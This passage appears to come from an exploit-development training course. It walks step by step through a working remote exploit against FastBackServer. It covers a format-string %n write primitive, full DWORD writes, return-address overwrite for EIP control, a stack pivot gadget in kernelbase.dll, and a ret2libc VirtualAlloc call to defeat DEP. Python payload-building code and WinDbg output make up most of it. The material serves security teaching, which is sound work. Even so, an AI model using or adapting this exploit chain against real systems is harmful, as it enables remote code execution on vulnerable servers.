As an example, the value contained in the first DWORD is currently 0xc4. When 0xc4 is processed by vsnprintf, the %x format specifier is used, which means two digits are written to the formatted string.
If the first DWORD were to change from 0xc4 to 0x1c4, it would result in 3 digits when formatted by vsnprintf, which in turn leads to an increase in the value returned through the %n specifier.
Let's determine if an instability exists, and if it does, figure out a way to solve it.
Let's begin by restarting FastBackServer, attaching WinDbg, setting a breakpoint at the location of our access violation (FastBackServer!_output+0x507), and then executing our Python script, which includes both the ASLR leak and the write primitive.
When the breakpoint is encountered, we'll follow the same dereference chain to locate the contents of the arguments array, as shown in Listing 26.
0:080> dc 0db2deb8 L28
0db2deb8  000000c4 0db2ded4 00000025 00000078  ........%...x...
0db2dec8  0000012e 001afd25 00000000 5f494741  ....%.......AGI_
0db2ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
0db2dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
0db2def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB
0db2df08  0db2eed4 253a7825 78253a78 3a78253a  ....%x:%x:%x:%x:
0db2df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
0db2df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
0db2df38  3a78253a 253a7825 78253a78 3532253a  :%x:%x:%x:%x:%25
0db2df48  6e253a78 78257825 78257825 78257825  x:%n%x%x%x%x%x%x
Listing 26 - Contents of argument array
By comparing the contents of the arguments array shown in Listing 26 and the those shown in Listing 25, we find that only the dynamic stack address and the sixth value differ.
The sixth value changed from 0x25 to 0x1afd25. When the new value of 0x1afd25 is processed by the %x specifier, it will take up an additional four characters. That means the value returned through the %n specifier is increased by 4 when the write primitive is invoked inside the combined script.
These leftover bytes on the stack, likely from a previous vsnprintf call, explain why the value we want to write is incorrect when the code is combined.
The number of characters written to the eventlog has increased from 2 to 6, but we can account for the increase by using a width value of "6" with the sixth %x specifier. This will ensure that the number of characters written to the event log will always remain constant. However, implementing this change will cause another issue.
Because four extra values are always printed, our algorithm is off. We previously found that we can write the values from 0xC7 up to a maximum of 0x1C7, but an increase of 4 to all values will push us over the maximum size. We can account for this by removing four of the colons used to separate the %x specifiers.
...
# psCommandBuffer
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000)
buf += b"%x" * 5 + b":"
buf += b"%6x:"
buf += b"%x:" * 13
buf += b"%" + b"%d" % width + b"x:"
buf += b"%n"
buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100 
...
Listing 27 - Accounting for the variable size
The colons are present to make it easier to identify separate values, but they're irrelevant when we invoke the write primitive.
Let's remove four of the colons, leaving our algorithm for calculating the width otherwise unchanged, and re-test the exploit.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x617fc
Stack address leaked to event log
The eventlog returned contains 1003 bytes
The size read is: 0x1003
Leaked stack address is: 0xee5ded4
Kernelbase address leaked to event log
The eventlog returned contains 803 bytes
The size read is: 0x803
Leaked Kernelbase address is: 0x745dc36a
Kernelbase base address is: 0x744d0000
Written 0xd8 to address 0xee5eed4
Listing 28 - Write a byte to the stack
After the input function is encountered, we will switch to WinDbg, break into it, and dump the contents at the address that we wrote to on the stack.
0:006> dd 0xee5eed4 L1
0ee5eed4  000000d8
Listing 29 - The correct value was written
Listing 29 shows that this time, the correct value was written to the stack. Excellent!
We are now one step closer to implementing the complete write primitive.
Exercises
1.	Combine the byte write code with the stack leak code and attempt to write a byte value.
2.	Repeat the analysis to figure out why the value is off by four.
3.	Implement a fix to the code that accounts for the variable content on the stack.
4.	What happens if FastBackServer runs for a long time and the stack address goes above 0x10000000? Ensure that your exploit handles this scenario.
12.1.4. Going for a DWORD
Our work in the previous sections has enabled us to write an arbitrary byte value to a specific memory address. Let's finish the work by combining four byte writes into a full DWORD write.
We can combine the four byte writes with a for loop, as shown in Listing 30. We'll use the dummy value 0x1234ABCD for testing.
Since each iteration only handles one byte, the DWORD is split by right-shifting the loop index eight times. The stack address we're writing to is also increased by the index value.
value = 0x1234ABCD

for index in range(4):
	byteValue = (value >> (8 * index)) & 0xFF
	if byteValue > 0xC6:
	  width = byteValue - 0xC7 + 0x8
	else:
	  width = byteValue + 0x39 + 0x8

	# psAgentCommand
	buf = pack(">i", 0x400)
	buf += bytearray([0x41]*0xC)
	buf += pack("<i", 0x604)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x100)  # 1st memcpy: size field
	buf += pack("<i", 0x100)  # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x200)  # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)

	# psCommandBuffer
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000 + index)
	buf += b"%x" * 5 + b":"
	buf += b"%6x:"
	buf += b"%x:" * 13
	buf += b"%" + b"%d" % width + b"x:"
	buf += b"%n"
	buf += b"%x" * 0x6b 
	buf += b"B" * 0x100 
	buf += b"C" * 0x100 

	# Padding
	buf += bytearray([0x41]*(0x404-len(buf)))

	s.send(buf)

print("Written " + str(hex(value)) + " to address " + str(hex(stackAddr + 0x1000)))
input()
Listing 30 - Four byte writes through a for loop
At the end of the code, we'll print the entire DWORD and the location we wrote it to.
Let's execute the Python code and, just before the input call, we'll find the new address to which the value is written.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61c1e
Stack address leaked to event log
The eventlog returned contains 1103 bytes
The size read is: 0x1103
Leaked stack address is: 0xfc5ded4
Kernelbase address leaked to event log
The eventlog returned contains 803 bytes
The size read is: 0x803
Leaked Kernelbase address is: 0x745dc36a
Kernelbase base address is: 0x744d0000
Written 0x1234abcd to address 0xfc5eed4
Listing 31 - Write a full DWORD to the stack
With the input call stopping execution, we can switch to WinDbg again and verify if the DWORD was written correctly.
0:006> dd 0xfc5eed4 L1
0fc5eed4  1234abcd
Listing 32 - The full DWORD is written to memory
Here we'll find the full DWORD, 0x1234ABCD, at the desired address.
As with most exploits, they are never 100% stable and sometimes the exploit will fail to execute all four writes.
Our hard work with the format string vulnerability has now resulted in the creation of both a read and write primitive, enabling us to read from and write to an arbitrary location in memory. These are powerful abilities that we can likely apply to achieve code execution.
Exercises
1.	Combine four byte writes in a for loop to obtain a full DWORD write, as shown in this section.
2.	Implement a writeDWORD function in the Python script to write a value to a given address. This will provide us with a more modular approach going forward.
12.2. Overwriting EIP with Format Strings
Now that we can write a DWORD anywhere in memory, let's figure out how to leverage that to obtain code execution.
In the next couple of sections, we'll focus on gaining control of EIP, which is the first step towards code execution. As part of this process, we'll learn how to locate a return address on the stack.
12.2.1. Locating a Target
In many stack-based vulnerabilities, EIP control is obtained by overwriting content on the stack outside of the bounds of a buffer. If we write enough content, we may be able to directly overwrite a stored return address on the stack, or perhaps the SEH chain.
To use our write primitive, let's find a return address stored on the stack that we can overwrite. We can only write one byte at a time, so we need to make sure the return address is not used before the entire DWORD has been written.
Overwriting a return address on the stack is also a common technique for bypassing the Control Flow Guard (CFG)1 security mitigation.
An optimal target will be located far down the call stack. To find possible candidates, let's set a breakpoint on _FastBackServer!output+0x507 where the byte value is written. We can then dump and search the stack for addresses that are present.
0:078> bp FastBackServer!_output+0x507

0:078> g
Breakpoint 0 hit
eax=0f4ceed4 ebx=0000006e ecx=00000144 edx=00000200 esi=0f4cdf4a edi=00000800
eip=00672f1a esp=0f4cd964 ebp=0f4cdbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:0f4ceed4=00000000

0:086> k
 # ChildEBP RetAddr  
00 0f4cdbbc 0066bf8e FastBackServer!_output+0x507
01 0f4cdbf4 0065b14b FastBackServer!_vsnprintf+0x2c
02 0f4cdc0c 004803ff FastBackServer!ml_vsnprintf+0x18
03 0f4cdea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
04 0f4ce2d4 0054b6a0 FastBackServer!EventLog+0x13c
05 0f4ce31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
06 0f52fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
07 0f52feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
08 0f52fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
09 0f52ff48 006693e9 FastBackServer!ORABR_Thread+0xef
0a 0f52ff80 75f19564 FastBackServer!_beginthreadex+0xf4
0b 0f52ff94 7722293c KERNEL32!BaseThreadInitThunk+0x24
...
Listing 33 - Call stack during byte write
Our initial reverse engineering performed in a previous module determined that when the network packet is received, the handler function returns into FX_AGENT_Cyclic, after which the packet is processed.
This means that the entire stack from entry 00 to 09 is modified between each network packet, and thus between each byte we write. We also know that the thread terminates when the network connection is closed.
Putting this together, we can overwrite FastBackServer!_beginthreadex+0xf4 on the stack and it will be triggered when we call s.close() in our Python script. We also know that nothing in that part of the stack will change while our packets are processed. In essence, it is a stable overwrite.
To find the exact location of the return address on the stack, we can display its contents from stack frame 09, as highlighted in the listing below.
0:086> dds 0f52ff48 
0f52ff48  0f52ff80
0f52ff4c  006693e9 FastBackServer!_beginthreadex+0xf4
0f52ff50  0771f6f0
...
Listing 34 - Location of return address on the stack
This is the exact address on the stack we want to overwrite.
Next, we need to determine the offset from the leaked stack address to the location of the return address. The leaked stack address is given in Listing 35.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x60087
Stack address leaked to event log
The eventlog returned contains 3403 bytes
The size read is: 0x3403
Leaked stack address is: 0xf4cded4
Kernelbase address leaked to event log
The eventlog returned contains 1d03 bytes
The size read is: 0x1d03
Leaked Kernelbase address is: 0x745dc36a
Kernelbase base address is: 0x744d0000
Listing 35 - Leaked stack address
We've obtained both values, and Listing 36 shows the resulting offset.
0:086> ? 0f52ff4c - 0xf4cded4
Evaluate expression: 401528 = 00062078
Listing 36 - Calculating the offset
It's important to ensure that this offset remains constant between restarts of the application and exploitation attempts.
If we restart FastBackServer, attach WinDbg, and execute the Python script with the input statement and no breakpoints, we can break into the execution and determine whether the offset remains constant.
0:001> dds 0x114dded4 + 62078 L1
1153ff4c  006693e9 FastBackServer!_beginthreadex+0xf4
Listing 37 - Verifying the offset
From this limited test, we can verify that the offset seems to remain static.
We have now found a very promising and (hopefully) stable return address on the stack that we can overwrite. In the next section, we will try to obtain control of EIP.
Exercises
1.	Follow the analysis and verify that the offset is constant.
2.	Are there any other viable return addresses?
1 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/secbp/control-flow-guard
12.2.2. Obtaining EIP Control
With our target located, we can finally use our write primitive to gain control of EIP.
In our Python code, we'll first calculate the location of the return address using the leaked stack address and the offset we found in the last section.
We can invoke our write primitive from a function called writeDWORD (developed in a previous exercise). This will make it more modular and the code easier to read. Let's write the dummy value 0x41414141 at the location of the return address.
print("Kernelbase base address is: " + str(hex(kernelbaseBase)))

returnAddr = stackAddr + 0x62078

print("About to overwrite return address at: " + str(hex(returnAddr)))
input()

writeDWORD(s, returnAddr, 0x41414141)

print("Return address overwritten")
input()

s.close()
sys.exit(0)
Listing 38 - Code to overwrite return address
Both prior to the write primitive and following it, we'll perform a print to the console and pause execution, so we can verify that everything is working correctly.
When the exploit is executed, we can break into WinDbg and check the address we are about to overwrite.
(277c.1d9c): Break instruction exception - code 80000003 (first chance)
eax=003c1000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0
eip=77251430 esp=137fff54 ebp=137fff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!DbgBreakPoint:
77251430 cc              int     3

0:079> dds 0x136fff4c L1
136fff4c  006693e9 FastBackServer!_beginthreadex+0xf4

0:079> g
Listing 39 - Checking return address before overwrite
After letting execution continue in WinDbg, let's switch back to the Python script and enter a key to let execution continue.
This will trigger the next call to input, and we now find that the return address has indeed been overwritten:
(277c.f8): Break instruction exception - code 80000003 (first chance)
eax=003c2000 ebx=00000000 ecx=77289bc0 edx=77289bc0 esi=77289bc0 edi=77289bc0
eip=77251430 esp=138fff54 ebp=138fff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
ntdll!DbgBreakPoint:
77251430 cc              int     3

0:079> dds 0x136fff4c L1
136fff4c  41414141

0:079> g
Listing 40 - Checking return address after overwrite
Our write primitive was successful! The return address has been overwritten on the stack.
Continuing execution in both WinDbg and the Python script closes the network connection, triggering the use of the overwritten return address.
(277c.1b6c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360
eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
Listing 41 - We have obtain control of EIP
EIP is now under our control. Hooray!
In previous modules, we completely smashed the stack by overwriting out of the bounds of a fixed-size buffer. If the application uses stack cookies,1 the cookie itself is also overwritten and the application will terminate.
Our write primitive overwrites with much more precision, bypassing such protections.
Bypassing ASLR and gaining control of EIP is not the end of the exploitation process. To enable shellcode to run, we need to deal with DEP next.
Exercise
1.	Use your previous Python script to overwrite the return address on the stack and obtain control of EIP.
1 (Wikipedia, 2021), https://en.wikipedia.org/wiki/Buffer_overflow_protection
12.3. Locating Storage Space
Leveraging our ASLR bypass from the previous module, we can use ROP to bypass DEP and obtain code execution.
Sadly, the data we have been working with so far is part of a format string, which is not an optimal storage location for a ROP chain or shellcode.
In the next couple of sections, we will figure out where we can store a ROP chain and shellcode. We'll also need to find a suitable stack pivot gadget.
12.3.1. Finding Buffers
The format string used to create the write primitive cannot contain the ROP chain or shellcode because it is interpreted as a character string in multiple locations. We might be able to solve this with encoding, but let's consider an alternative.
From our initial work reverse engineering psAgentCommand and psCommandBuffer, we know that our data is treated as three separate buffers. These three buffers are copied into unique stack buffers during initial processing.
We want to send a last packet with an invalid opcode after the return address has been overwritten, then confirm whether the contents of the psCommandBuffers are still present in memory, when we gain control of EIP.
Listing 42 shows the construction of a packet that will contain an opcode value of 0x80, which is below the minimum value of 0x100 found in FXCLI_OraBR_Exec_Command.
print("Sending payload")
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x80)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"DDDDEEEEFFFFGGGGHHHH"
buf += b"C" * 0x200

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))
s.send(buf)
Listing 42 - Code to send payload packet
For the content of the first psCommandBuffer, we'll enter an easily-recognizable buffer that we can search for.
Let's update and execute the Python script. When the connection closes, EIP is overwritten with 0x41414141, triggering an access violation as shown in the previous section. At this point, we can search the stack for the psCommandBuffer.
We'll start by using the !teb command to find the StackBase and StackLimit.
0:088> !teb
TEB at 003c0000
    ExceptionList:        0fc0ff70 
    StackBase:            0fc10000 
    StackLimit:           0fb92000
    SubSystemTib:         00000000
...

0:089> ? (0fc10000 - 0fb92000)/4
Evaluate expression: 129024 = 0001f800
Listing 43 - Finding the size of the current stack
After finding the boundaries of the stack, we can calculate the number of DWORDs it requires. Searching for a single byte on the stack will likely result in multiple false positive results, but a value such as 0x44444444 does not commonly appear.
We can use s to conduct a DWORD search for the content of the psCommandBuffer, which is why we needed to know the amount of DWORDs on the stack.
0:089> s -d 0fb92000 L?1f800 0x44444444
0fb95c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
0fc03b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
Listing 44 - Searching for the psCommandBuffer
It seems we've successfully located two separate buffers containing our input. While we could select either buffer in theory, we should keep bad characters in mind.
From the experience we have gained throughout this course and by reverse engineering the protocol processing of FastBackServer, we know that some copy operations introduce bad characters. When strcpy is used, NULL bytes will terminate the string. When sscanf is used, multiple characters will become bad characters, including NULL bytes. But when a copy operation is performed with memcpy, there are no bad characters.
Based on this information, if we modify the packet to include one or more NULL bytes, we can (hopefully) locate a buffer that is free of bad characters.
In Listing 45, the value 0x00000200 is appended to the unique string inside the code.
# psCommandBuffer
buf += b"DDDDEEEEFFFFGGGGHHHH"
buf += pack("<i", 0x200)
buf += b"C" * 0x200

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))
s.send(buf)
Listing 45 - psCommandBuffer contains NULL bytes
After restarting FastBackServer, attaching WinDbg, and executing the updated exploit, we'll again trigger the access violation to find the StackBase, StackLimit, and number of DWORDs on the stack.
0:089> !teb
TEB at 00340000
    ExceptionList:        0fa7ff70
    StackBase:            0fa80000
    StackLimit:           0fa02000
    SubSystemTib:         00000000
    
0:089> ? (0fa80000 - 0fa02000)/4
Evaluate expression: 129024 = 0001f800
Listing 46 - Finding the size of the current stack
Next, we'll repeat the search for the psCommandBuffer.
0:089> s -d 0fa02000 L?0001f800 0x44444444
0fa05c20  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG
0fa73b30  44444444 45454545 46464646 47474747  DDDDEEEEFFFFGGGG

0:089> dd 0fa05c20 LC
0fa05c20  44444444 45454545 46464646 47474747
0fa05c30  48484848 43434300 43434343 43434343
0fa05c40  43434343 43434343 43434343 43434343

0:089> dd 0fa73b30 LC
0fa73b30  44444444 45454545 46464646 47474747
0fa73b40  48484848 00000200 43434343 43434343
0fa73b50  43434343 43434343 43434343 43434343
Listing 47 - Two copies of psCommandBuffer on the stack
When we dump the contents of the two instances of the psCommandBuffer on the stack, we'll notice that the first instance does not handle the NULL bytes well.
The second instance contains exactly the desired content, so we'll use it going forward.
If we can reliably locate the buffer in memory, given the leaked stack pointer, it will serve as a perfect buffer location for the ROP chain and shellcode.
Listing 48 shows the console output from running the Python script, giving us the leaked stack address.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61eae
Stack address leaked to event log
The eventlog returned contains 3a03 bytes
The size read is: 0x3a03
Leaked stack address is: 0xfa1ded4
Kernelbase address leaked to event log
...
Listing 48 - Leaked stack address from Python script
We can now calculate the offset between the leaked stack address and the psCommandBuffer.
0:089> ? 0fa73b30   - 0fa1ded4
Evaluate expression: 351324 = 00055c5c
Listing 49 - Offset from stack address to the psCommandBuffer
Running the exploit multiple times reveals the offset from the leaked stack address to the second psCommandBuffer is constant.
We can reliably use this as our storage buffer.
In this section, we learned how to craft a final network packet containing a placeholder ROP chain and shellcode. Its location inside the psCommandBuffers on the stack is determined from our stack address leak.
Next, we need to determine how to leverage a stack pivot so we can perform a ROP attack.
Exercises
1.	Update your code and follow the analysis in this section to locate the psCommandBuffers in memory.
2.	Include NULL bytes as part of the psCommandBuffer and determine which of the two instances handles them correctly.
3.	Verify that the offset between the leaked stack pointer and the psCommandBuffer remains constant across application restarts.
12.3.2. Stack Pivot
The ROP technique depends on our ability to control the stack. In many vulnerabilities, ESP does not automatically point to our ROP chain, so we'll need to modify it as our first step.
If we attempt to overwrite EIP when we do not control the stack, we are typically limited to using only a single ROP gadget to pivot to the stack, otherwise we'll lose control of EIP and the application crashes.
Common stack pivot gadgets are "MOV ESP, R32" or "XCHG ESP, R32", where R32 is any 32-bit register. These type of pivot gadgets work if any of the registers contain the address of the buffer where we put our ROP chain.
EIP is overwritten when the network connection closes, which means the execution context will not be related to our input buffers. We'll need to be more creative to execute a stack pivot.
Because of the stack leak and constant offset value to the psCommandBuffer, we know the absolute address of where the return address is stored when we overwrite EIP.
With this in mind, let's place two DWORDs on the stack: the address of a "POP ESP; RET;" gadget, followed by the absolute stack address of the second psCommandBuffer portion. If we align them correctly, the "POP ESP" instruction will pop the address of the psCommandBuffer into ESP and return into it immediately, aligning it with the subsequent ROP chain.
To avoid corrupting the gadget address with our write primitive, we'll need to write the absolute stack address of the second psCommandBuffer portion before the gadget.
Using RP++ to generate gadgets from kernelbase.dll, we do not find any clean "POP ESP" gadgets. One of the most suitable options is shown in Listing 50.
0x100e1af4: pop esp ; add esi, dword [ebp+0x03] ; mov al, 0x01 ; ret
Listing 50 - Stack pivot gadget
The side effects of this gadget are minimal. EBP will be a stack pointer by default, so the dereference does not cause an access violation, and modifying AL is not a problem.
Now that we know what we want to put into EIP and how to pivot the stack, we need to determine an address for the second psCommandBuffer that will work with the pivot gadget.
We can figure this out easily by looking back at the previous execution of our exploit and comparing the location of the return address we overwrote with the value in ESP when the access violation is triggered.
Listing 51 repeats the output from the previous execution of the exploit and reveals the stack address at which we overwrote the return address.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x6080e
...
Kernelbase address leaked to event log
About to overwrite return address at: 0x136fff4c
Return address overwritten
Listing 51 - Return address on the stack
Likewise, Listing 52 repeats the contents of the registers when EIP is overwritten and the access violation is caused.
(277c.1b6c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=060eaf60 ecx=136fff70 edx=011208d0 esi=060eaf60 edi=00669360
eip=41414141 esp=136fff54 ebp=136fff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
41414141 ??              ???
Listing 52 - Address in ESP when EIP is overwritten
A comparison of the two addresses (0x136fff4c and 0x136fff54) shows a difference of eight between the return overwrite address and the location to which we must write the psCommandBuffer address.
We now have all the information we need to update the exploit code and trigger the stack pivot. The changes are given in Listing 53. First, we'll calculate the address of the second psCommandBuffer and the stack pivot gadget. We can then use the write primitive to place them both on the stack eight bytes apart.
returnAddr = stackAddr + 0x62078
bufAddr = stackAddr + 0x55c5c
pivotAddr = kernelbaseBase + 0xe1af4

print("About to overwrite return address at: " + str(hex(returnAddr)))
writeDWORD(s, returnAddr, pivotAddr)
writeDWORD(s, returnAddr+8, bufAddr)
print("Return address overwritten")

s.close()
Listing 53 - Updated Python code to trigger stack pivot
It's time to test our updated exploit.
We'll restart FastBackServer, attach WinDbg, and set a breakpoint on the stack pivot at kernelbase+0xe1af4. When the exploit is executed, the breakpoint is successfully triggered, as shown in Listing 54.
0:077> bp kernelbase+0xe1af4

0:078> g
Breakpoint 0 hit
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360
eip=745b1af4 esp=0fbaff54 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!ConsoleIsConsoleSubsystem+0x16:
745b1af4 5c              pop     esp

0:089> dd esp L4
0fbaff54  0fba3b30 00000001 060cbdb8 00000000
Listing 54 - Breakpoint on pivot gadget is triggered
At the end of Listing 54, we dump the first four DWORDs of the stack, enabling us to observe the stack pivot taking place as soon as the "POP ESP" instruction is executed.
0:089> p
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=060cbdb8 edi=00669360
eip=745b1af5 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!ConsoleIsConsoleSubsystem+0x17:
745b1af5 037503          add     esi,dword ptr [ebp+3] ss:0023:0fbaff83=f195640f

0:089> dd esp L4
0fba3b30  44444444 45454545 46464646 47474747
Listing 55 - ESP is changed to the psCommandBuffer
Listing 55 shows that our work has paid off and we managed to pivot the stack to the psCommandBuffer. Excellent!
The final part of this pivot ensures that the remainder of the stack pivot gadget executes and returns us into the first DWORD of the psCommandBuffer.
0:089> p
eax=00000000 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
eip=745b1af8 esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
KERNELBASE!ConsoleIsConsoleSubsystem+0x1a:
745b1af8 b001            mov     al,1

0:089> p
eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
eip=745b1afa esp=0fba3b30 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
KERNELBASE!ConsoleIsConsoleSubsystem+0x1c:
745b1afa c3              ret

0:089> p
eax=00000001 ebx=060cbdb8 ecx=0fbaff70 edx=012308d0 esi=f7a221c7 edi=00669360
eip=44444444 esp=0fba3b34 ebp=0fbaff80 iopl=0         nv up ei ng nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000292
44444444 ??              ???
Listing 56 - Stack pivot gadget executes to the end
EIP now contains the first DWORD from the psCommandBuffer and ESP points correctly, which will allow us to invoke a ROP chain.
In this section, we leveraged our write primitive to precisely align both EIP and ESP, setting the stage for a ROP attack.
Exercise
1.	Perform the modifications required in the exploit and step through the stack pivot.
12.4. Getting Code Execution
The analysis and development needed for this exploit has been intense, but we're nearing the end. Two challenges remain: disabling DEP and executing shellcode.
To bypass DEP, we will use VirtualAlloc (as in previous modules) to modify the memory protections of the memory pages inside the psCommandBuffer that contains our shellcode.
12.4.1. ROP Limitations
When building our ROP chain, we first need to figure out which technique we'll use to bypass DEP, and then examine what arguments we must supply to the API in question.
In this case, we'll use VirtualAlloc,1 the function prototype of which is given in Listing 57.
LPVOID VirtualAlloc(
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
Listing 57 - Function prototype for VirtualAlloc
VirtualAlloc has four arguments. We will also need to supply the return address and the address of the function itself.
In previous ROP attacks, we placed a ROP skeleton on the stack and dynamically updated the dummy values with correct values. This is often necessary due to three limitations:
1.	The address of VirtualAlloc is not known beforehand due to ASLR.
2.	The stack address of the shellcode is not known beforehand.
3.	NULL bytes are bad characters and cannot be used.
Let's examine each of these limitations while considering our current situation.
Our ASLR bypass that leaks the base address of kernelbase.dll allows us to bypass the first limitation by simply adding an offset to its base address to obtain the address of VirtualAlloc. The stack address is also leaked beforehand, which means the second limitation does not apply either.
Since we will place the ROP chain in the psCommandBuffer and we have already found that NULL bytes are allowed in this buffer, we can hardcode the values for dwSize, flAllocationType, and flProtect. The shellcode address can also be part of the buffer, even if it contains NULL bytes.
All of our hard work and pre-determined knowledge essentially transforms the ROP chain attack into an old-fashioned Ret2Libc attack, enabling us to directly call into VirtualAlloc after the stack pivot.
We'll need to set up the stack as illustrated in Listing 58 when the stack pivot finishes.
VirtualAlloc address
Return address == Shellcode address
Shellcode address
0x200
0x1000
0x40
Listing 58 - VirtualAlloc arguments on the stack
Since we use the psCommandBuffer of the last packet as our ROP and shellcode storage, we can directly place the VirtualAlloc related values into it, as shown in the code segment of Listing 59.
print("Sending payload")
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x80)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += pack("<i", kernelbaseBase + 0x1125d0)
buf += pack("<i", bufAddr + 0x18)
buf += pack("<i", bufAddr + 0x18)
buf += pack("<i", 0x200)
buf += pack("<i", 0x1000)
buf += pack("<i", 0x40)
buf += b"C" * 0x200

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))
s.send(buf)
Listing 59 - Implemented ret2lib packet
The address of VirtualAlloc is found as an offset from the base address of kernelbase.dll, and the offset of 0x18 bytes from the psCommandBuffer aligns with the placeholder shellcode represented with C's.
Now, let's restart FastBackServer, set a breakpoint on the stack pivot, and execute the updated Python code.
0:067> bp kernelbase+0xe1af4

0:067> g
Breakpoint 0 hit
eax=00000000 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=0610c280 edi=00669360
eip=745b1af4 esp=0f61ff54 ebp=0f61ff80 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
KERNELBASE!ConsoleIsConsoleSubsystem+0x16:
745b1af4 5c              pop     esp

0:088> p
...
0:088> p
eax=00000001 ebx=0610c280 ecx=0f61ff70 edx=00da08d0 esi=f7a6268f edi=00669360
eip=745e25d0 esp=0f613b34 ebp=0f61ff80 iopl=0         nv up ei ng nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000282
KERNELBASE!VirtualAlloc:
745e25d0 8bff            mov     edi,edi

0:088> dds esp L5
0f613b34  0f613b48
0f613b38  0f613b48
0f613b3c  00000200
0f613b40  00001000
0f613b44  00000040
Listing 60 - Pivoting into VirtualAlloc
Once the stack pivot finishes, we'll land directly into VirtualAlloc and, as highlighted in Listing 60, the return address and required arguments are set.
We can now verify that the return address contains our placeholder shellcode and check the memory protections of the shellcode location before VirtualAlloc is executed.
0:088> u 0f613b48 L4
0f613b48 43              inc     ebx
